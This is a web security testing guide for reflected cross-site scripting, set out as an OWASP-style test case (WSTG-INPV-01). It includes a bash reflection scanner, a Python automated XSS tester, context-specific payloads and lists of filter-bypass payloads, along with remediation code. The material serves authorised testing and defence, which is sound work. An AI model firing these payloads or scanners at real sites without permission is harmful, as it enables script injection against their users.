# WSTG-INPV-01: Testing for Reflected Cross-Site Scripting (XSS)

## Test ID
WSTG-INPV-01

## Test Name
Testing for Reflected Cross-Site Scripting (XSS)

## High-Level Description

Reflected XSS occurs when user input is immediately returned by the application without proper sanitization. The malicious script is reflected off the web server in error messages, search results, or any response that includes user input. This allows attackers to execute scripts in victims' browsers through crafted URLs.

---

## What to Check

- [ ] URL parameters reflected in response
- [ ] Form inputs reflected in response
- [ ] HTTP headers reflected in response
- [ ] Error messages containing user input
- [ ] Search functionality
- [ ] Redirect parameters

---

## How to Test

### Step 1: Identify Reflection Points

```bash
#!/bin/bash
TARGET="https://target.com"

# Test common parameters for reflection
PARAMS=("q" "search" "query" "s" "id" "page" "name" "url" "redirect" "callback")
TEST_STRING="xss_test_12345"

for param in "${PARAMS[@]}"; do
    response=$(curl -s "$TARGET?$param=$TEST_STRING")
    if echo "$response" | grep -q "$TEST_STRING"; then
        echo "[*] Reflection found in parameter: $param"
    fi
done

# Test POST forms
curl -s "$TARGET/search" -d "query=$TEST_STRING" | grep -q "$TEST_STRING" && \
    echo "[*] Reflection in POST parameter: query"
```

### Step 2: Reflected XSS Tester

```python
#!/usr/bin/env python3
"""
Reflected XSS Vulnerability Tester
"""

import requests
import re
from urllib.parse import urljoin, quote
from html import escape

class ReflectedXSSTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 XSS-Tester'

    # Basic XSS payloads
    PAYLOADS = [
        # Basic script injection
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',

        # Event handlers
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',

        # Bypasses - case variation
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x ONERROR=alert(1)>',

        # Bypasses - encoding
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',

        # Bypasses - no quotes
        '<img src=x onerror=alert(1)>',

        # Bypasses - backticks
        '<img src=x onerror=`alert(1)`>',

        # Attribute injection
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",

        # JavaScript URI
        'javascript:alert(1)',
        'javascript:alert(document.domain)',

        # Data URI
        'data:text/html,<script>alert(1)</script>',

        # SVG-based
        '<svg/onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
    ]

    def find_parameters(self):
        """Extract parameters from page"""
        print(f"[*] Finding parameters on {self.url}")

        response = self.session.get(self.url)

        # Find form inputs
        inputs = re.findall(r'name=["\']([^"\']+)["\']', response.text)

        # Find URL parameters in links
        params = re.findall(r'[?&]([^=&]+)=', response.text)

        all_params = list(set(inputs + params))
        print(f"  Found {len(all_params)} parameters")
        return all_params

    def test_reflection(self, param, method='GET'):
        """Test if parameter reflects input"""
        canary = f"xss{hash(param) % 10000}test"

        if method == 'GET':
            response = self.session.get(self.url, params={param: canary})
        else:
            response = self.session.post(self.url, data={param: canary})

        return canary in response.text

    def get_context(self, response_text, payload):
        """Determine injection context"""
        if payload in response_text:
            # Check context
            before_idx = response_text.find(payload)
            before = response_text[max(0, before_idx-50):before_idx]

            if re.search(r'<script[^>]*>[^<]*$', before):
                return 'javascript'
            elif re.search(r'<[^>]+\s+\w+\s*=\s*["\']?[^"\']*$', before):
                return 'attribute'
            elif re.search(r'<style[^>]*>[^<]*$', before):
                return 'css'
            elif re.search(r'<!--[^>]*$', before):
                return 'comment'
            else:
                return 'html'
        return None

    def test_xss(self, param, method='GET'):
        """Test parameter for XSS"""
        print(f"\n[*] Testing parameter: {param}")

        # First check if it reflects
        if not self.test_reflection(param, method):
            print(f"  [-] No reflection found")
            return

        print(f"  [+] Parameter reflects input")

        # Test payloads
        for payload in self.PAYLOADS:
            try:
                if method == 'GET':
                    response = self.session.get(self.url, params={param: payload})
                else:
                    response = self.session.post(self.url, data={param: payload})

                # Check if payload is reflected unencoded
                if payload in response.text:
                    context = self.get_context(response.text, payload)
                    print(f"  [VULN] XSS payload reflected unencoded!")
                    print(f"    Payload: {payload[:50]}")
                    print(f"    Context: {context}")

                    self.findings.append({
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'context': context,
                        'severity': 'High'
                    })
                    return  # Found vulnerability, stop testing this param

                # Check for partial reflection (filter bypass needed)
                elif 'alert' in response.text or 'onerror' in response.text:
                    print(f"  [INFO] Partial reflection detected")

            except Exception as e:
                pass

    def test_headers(self):
        """Test HTTP headers for XSS"""
        print("\n[*] Testing HTTP headers...")

        headers_to_test = [
            ('User-Agent', '<script>alert(1)</script>'),
            ('Referer', '<script>alert(1)</script>'),
            ('X-Forwarded-For', '<script>alert(1)</script>'),
            ('X-Forwarded-Host', '<script>alert(1)</script>'),
        ]

        for header, payload in headers_to_test:
            try:
                response = self.session.get(self.url, headers={header: payload})
                if payload in response.text:
                    print(f"  [VULN] Header {header} reflects XSS payload")
                    self.findings.append({
                        'parameter': f'Header: {header}',
                        'method': 'GET',
                        'payload': payload,
                        'context': 'header',
                        'severity': 'High'
                    })
            except:
                pass

    def generate_poc(self, finding):
        """Generate PoC URL"""
        if finding['method'] == 'GET':
            return f"{self.url}?{finding['parameter']}={quote(finding['payload'])}"
        else:
            return f"POST {self.url} with {finding['parameter']}={finding['payload']}"

    def run_tests(self):
        """Run all XSS tests"""
        params = self.find_parameters()

        for param in params:
            self.test_xss(param, 'GET')
            self.test_xss(param, 'POST')

        self.test_headers()
        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("REFLECTED XSS VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo reflected XSS vulnerabilities found.")
        else:
            print(f"\nFound {len(self.findings)} vulnerabilities:\n")
            for f in self.findings:
                print(f"[{f['severity']}] {f['parameter']}")
                print(f"  Method: {f['method']}")
                print(f"  Context: {f['context']}")
                print(f"  Payload: {f['payload'][:60]}")
                print(f"  PoC: {self.generate_poc(f)}")
                print()

# Usage
tester = ReflectedXSSTester("https://target.com/search")
tester.run_tests()
```

### Step 3: Context-Specific Payloads

```javascript
// HTML Context
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

// Attribute Context (inside value)
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" autofocus onfocus="alert(1)

// JavaScript Context (inside string)
';alert(1)//
"-alert(1)-"
\';alert(1)//

// URL Context
javascript:alert(1)
data:text/html,<script>alert(1)</script>

// CSS Context
</style><script>alert(1)</script>
expression(alert(1))
```

### Step 4: Filter Bypass Techniques

```python
# Common XSS filter bypasses
BYPASS_PAYLOADS = [
    # Case manipulation
    '<ScRiPt>alert(1)</ScRiPt>',
    '<SCRIPT>alert(1)</SCRIPT>',

    # Null bytes
    '<scr\x00ipt>alert(1)</script>',

    # Encoding
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',

    # Double encoding
    '%253Cscript%253Ealert(1)%253C/script%253E',

    # Unicode
    '<script>\u0061lert(1)</script>',

    # HTML entities
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',

    # Incomplete tags
    '<script>alert(1)</script',
    '<script>alert(1)',

    # Nested tags
    '<<script>script>alert(1)</script>',
    '<scr<script>ipt>alert(1)</script>',

    # No parentheses
    '<img src=x onerror=alert`1`>',
    '<svg/onload=alert&lpar;1&rpar;>',

    # No quotes
    '<img src=x onerror=alert(1)>',

    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept and modify requests |
| XSStrike | Automated XSS detection |
| Dalfox | Fast XSS scanner |
| XSS Hunter | Blind XSS detection |
| OWASP ZAP | Web vulnerability scanner |

---

## Remediation

```python
# Python/Flask - Output encoding
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Escape output before rendering
    safe_query = escape(query)
    return render_template('search.html', query=safe_query)

# Use Content Security Policy
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

```javascript
// JavaScript - Safe DOM manipulation
// BAD - vulnerable to XSS
element.innerHTML = userInput;

// GOOD - use textContent for text
element.textContent = userInput;

// GOOD - use DOMPurify for HTML
element.innerHTML = DOMPurify.sanitize(userInput);
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Reflected XSS (no filter) | 6.1 | Medium |
| Reflected XSS (filter bypass) | 6.1 | Medium |
| Reflected XSS in sensitive page | 7.1 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

## Checklist

```
[ ] URL parameters tested
[ ] POST parameters tested
[ ] HTTP headers tested
[ ] Multiple encoding tested
[ ] Filter bypasses attempted
[ ] Context-specific payloads used
[ ] PoC URLs documented
[ ] Findings documented
```
